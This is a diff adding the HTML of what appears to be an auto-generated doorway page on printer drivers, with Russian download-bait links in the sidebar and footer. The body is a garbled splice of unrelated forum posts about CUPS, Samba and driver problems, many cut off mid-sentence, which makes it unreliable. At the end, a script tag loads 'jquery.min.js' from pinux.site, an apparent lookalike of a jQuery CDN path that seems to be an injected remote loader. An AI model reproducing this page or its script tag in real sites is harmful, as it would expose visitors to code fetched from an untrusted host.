@@ -1,0 +1,145 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Postscript driver - aesiyoopa.125yingjiang.xyz</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">aesiyoopa.125yingjiang.xyz</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Postscript driver</h2>
+                            </header>
+                            <p> I'm trying to get myself out of printer hell, and part of my solution may be CUPS. I'll skip a lot of the details for now and just straight up ask, does anyone know how to get CUPS+Samba working with windows clients using Generic Postscript drivers where Samba actually installs the drivers automatically? I'm using cupsaddsmb and it attempts to install the driver but fails (Windows 8x64 for testing). I think it's using the Adobe postscript driver, and maybe failing due to driver signing A couple of weeks ago, an ex-colleague and still-friend mentioned his old mentor who had "trouble printing". I got nerdsniped like no tomorrow and kept asking questions, but he of course knew not much about the problem. So instead he gave me the mentor ($mnt)'s number. I contacted $mnt and we quickly agreed on a date for a quick first glance and see what I could do, it quickly dawned on me I was in deeper than I thought. This was the sitch: $mnt had an old $fruitypc (1980s old) on which. I need help! I have been thrown into "the printing role" and have been tasked for the past few months to migrate our windows PaperCut install to Azure on Windows Server 2016. We have about 200+ macbooks in the environment, but a lot more Windows PC. I migrated all the printers to Azure just this past week and this past monday was the first day where everyone in the company was printing to this print queue. Everything was going smoothly.until we found out Mac printing is taking All was well with the latest from 2018. Then MS pushed 1903, and screwed it up, again. Our Ricoh printers were just perfect, but now they choke on windows network packets and take forever just to print a test page. It has been so for 2 weeks now. We just installed the new drivers from Ricoh, and tried them all, only to come home empty handed. The printers are fine and dandy with Macs. I think I'll put win printers on cups. Update: problem solved (fingers crossed) by uninstalling all ricoh. Attempted to add a Fiery Printer (Cannon Image Runner 5560i) to a Windows 10 machine I have hooked up to my offices network. Went through the Windows 10 process of adding a local network printer. The printer is detected and I am able to execute a print. The printer detects the incoming file but what it prints is gibberish. I downloaded what I thought was the appropriate driver from cannon (Cannon D1500 Series UFR II) I also downloaded the (ImagePass P2 Post Script Driver) 
+Hey guys A remote location i help support informed me that their printer doesn’t work with 10.12+ recently, and I’ve been trying to find a solution. This is a ~15 year old printer with no purchase history. I downloaded the Mac driver from the web console page but it has a version check before running the pkg, telling me it is incompatible with my OS. I was going to extract the pkg with pacifist when I get in today to see if there was anything helpful in there. I’ve spoken We recently upgraded our enterprise to nice Xerox printers. Particularly C70s. We also implemented PaperCut and a windows print server so we can hold departments responsible for their excessive amounts of printing. For the windows side of things, this works fine. For the Mac side of things is where we run into problems. amp#x200B; Using the Xerox drivers for the printers and printing via the windows print server, bringing up the print dialog box takes about 15 seconds and sometimes I have a project task of building out an HA solution for entire environment, both our Windows print server and CUPS. Neither of them are HA right now. However, we have printers in a single CUPS server that handles print jobs coming from our Oracle ERP. It's my understanding that because of the postscript driver used in Oracle, these jobs have to route to a Linux print queue. They simply can't be interpreted by a Windows print server. Hence the 2 solutions. Edit: I've done a little more resear. I have an HP LaserJet 1320 on a CUPS print server, and for whatever reason, any sort of graphics heavy stuff takes forever to print. For example, printing game manuals takes a long time since they contain graphics. Lineart and text work fine. It can take upwards of 45 minutes to print out a 4 page document, which is completely unreasonable, but nothing I've tried has worked. The print server is set up to use the raw driver, and the client is set up with the postscript driver. I also tried. 
+Hi everyone, I'm having an issue with OSX server and printer sharing. The server, running 10.8, has it's printers added with their drivers. They're shared over the network. When shared to the client computers the printers only appear to be using the generic postscript drivers instead of the proper ones for the model. I have an HP Color Laserjet M553N that is printing purple as either black or blue whenever printing from the Windows side. Everything prints fine from the Macintosh side. I have tried using both PCL and Postscript drivers and both have given me these problems. I will start with a TL;DR: I need to add a postscript printer that is being shared by a Windows NT computer to a Windows 7 computer with just the PPD. Super detailed version: I have a RipIt Imagesetter 300 x1 connected to a Windows NT computer running OpenRip Symphony V3. The Windows NT computer publishes a variety of shared printers for the various print queues within the RIP software. These shared printers are then added by various other machines on the network. The only drivers 
+Sorry if this is a silly question, but Google hasn't been kind to me with this one, and I inherited this print setup so I'm trying to learn how it works as I go. We have an Ubuntu 12.04 print server serving up a hundred or so network printers to a mixture of linux and windows 7 clients and all is good with the world. Or at least, all _was_ good with the world until Windows 8 finally reached sufficient BYOD saturation that we can't ignore it any more. W8 responds with "No driver found" As someone who used to work in IT, I naturally have come to hate printers. In thinking about this, I think the main reason is that printers are standardized in any way whatsoever. Drivers, ink cartridges, form factors, etc. The only thing that's actually standardized is the size of paper. amp#x200B; So my question is why don't printer standards exist? What about printers makes it like this? We have standards for almost everything else in the computer space, but not printers. I understand. Hello /r/techsupport. Hopefully this is in the right place, but I have a really odd issue with several computers I manage at work. The issue is, that when a user prints a document (irrelevant of what program it is printed from eg. word, excel, chrome, adobe reader, etc). The word TRUE is added to the bottom of the printed document on the left hand side. It typically is ~6-8pt font. Which makes it harder to spot unless you look for it. In addition if you print to a PDF file, the word "TRUE". Part one ( So the district tech person emails the yearbook teacher (T1) and asks what needs to be done to fix the printers. so i get asked what needs to be done. me: for the lexmark you need to download the drivers and for the dell you need to find and download the driver. T1: your Ms.s (T2) can print to the dell and it works right. me: is it from the pc or the mac. T1: I think the mac but lets check. Thanks in advance for any help that is provided. Background: I am the informal IT guy for a small business with a number of offices. We are just starting to get into using RDP a bit thanks to one of our industry-specific applications being "chatty" (their code word for runs like shit on anything but a LAN). Computers: Two computers in home office running fully updated Windows 7 Pro acting as RDP "hosts". One client running Mac OS X and connecting with Microsoft Remote Desktop (I don't. Lubuntu is one of the few buntu variants to still have some support for the aging PPC platform. I took a wild leap and removed OSX 10.5.8 from my Mini (which I had upgraded to 1GB RAM years ago and installed Lubuntu 13.04. There was an initial quirk upon installing, almost big enough to make me abandon the installation  I had to specify the Radeon video card on the yaboot bootup screen: (live video=radeonfb:1024x768-32@60), otherwise the display showed abstract pink lines and other artifact. 
+I am helping a friend of mine who has a very old MS-Dos application (getting rid of in 6-9 months). They used to be able to print to an old printer, but recently they moved offices and bought a new HP Laserjet Pro. I have it successfully printing to the printer, but the font / resolution is slightly off and cutting off some of the text. Anyone know of any tricks to manipulate the output? Changing the printer properties doesn't help and the application has no built in controls. Thanks in advan. I need to find the HP Laserjet 5M for Windows 10 1809 machine. I’ve tried the Windows Update button on the drivers list but no luck. Tried to find it on 3 different windows 10 machines but all didn’t have the driver. Tried to look online however no luck there either. Anyone have this problem. Hello all! New here, hope this is the right place to post. My company recently made a move to Debian and we're having issues easily adding the different printers in our environment to our VDI solution. I've found products like PrinterLogic, but our new boss is big into open source solutions. Anyone have any ideas as to what I could be looking into to try and find something that will support a plethora of different printers makes and models for which I can't easily find Linux drivers for online?. 
+Is there management software on amiga or would it just work because parallel port? amp#x200B; I'm looking to get a dot matrix printer so I can never pay for ink again. And with that, I decided "Heyi I could hook it up to my amiga." and now I'm here. amp#x200B; I'm looking at one of these used for 100 bucks. amp#x200B; https://www.amazon.com/Epson-FX-890-Impact-Printer-C11C524001/dp/B0000AZK6I (https://www.amazon.com/Epson-FX-890-Impact-Printer-C11C524001/dp/B0000AZK6I) amp#x20. User today told me he couldn't see the Ricoh printer to print a PDF document. I thought, "that's odd. It WAS working." I go look at his printers and it's most certainly there. Tried setting it as default and Windows gives me an error saying it couldn't connect. No big deal. Let's just remove it and reinstall it. Here's where the fun starts. Tried reinstalling the printer from the server and got another Windows error that was more cryptic saying it couldn't connect with an error </p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="hb12o-everest-skachat-64-bit.html">Everest скачать 64 bit</a></li>
+                                <li><a href="hb12o-verhnyaya-stroka-v-excel-cifry-vmesto-bukv.html">Верхняя строка в excel цифры вместо букв</a></li>
+                                <li><a href="hb12o-raspisanie-avtobusov-s-satki-do-miassa.html">Расписание автобусов с сатки до миасса</a></li>
+                                <li><a href="hb12o-vyazhem-shapki-spicami-dlya-zhenschin-shemy.html">Вяжем шапки спицами для женщин схемы</a></li>
+                                <li><a href="hb12o-ne-ustanavlivayutsya-rasshireniya-v-opere.html">Не устанавливаются расширения в опере</a></li>
+                                <li><a href="hb12o-uroki-lyubvi-kniga-skachat.html">Уроки любви книга скачать</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="hb12o-shema-poperechnogo-pozdovzhnogo-sklep-n-stopi.html">Схема поперечного і поздовжнього склепінь стопи</a></li>
+                                            <li><a href="hb12o-raspisanie-taganrog-moskva-samolet.html">Расписание таганрог москва самолет</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="hb12o-gost-10549-80-pdf.html">Гост 10549 80 pdf</a></li>
+                                            <li><a href="hb12o-perevod-infinite-come-back-again.html">Перевод infinite come back again</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="hb12o-skachat-albom-mp3-yuriy-antonov-besplatno.html">Скачать альбом mp3 юрий антонов бесплатно</a></li>
+                                            <li><a href="hb12o-zhurnal-radiomir-1-2014-skachat.html">Журнал радиомир 1 2014 скачать</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="hb12o-skachat-fabrika-pro-lyubov.html">Скачать фабрика про любовь</a></li>
+                                            <li><a href="hb12o-skachat-knigu-besplatno-99-frankov.html">Скачать книгу бесплатно 99 франков</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
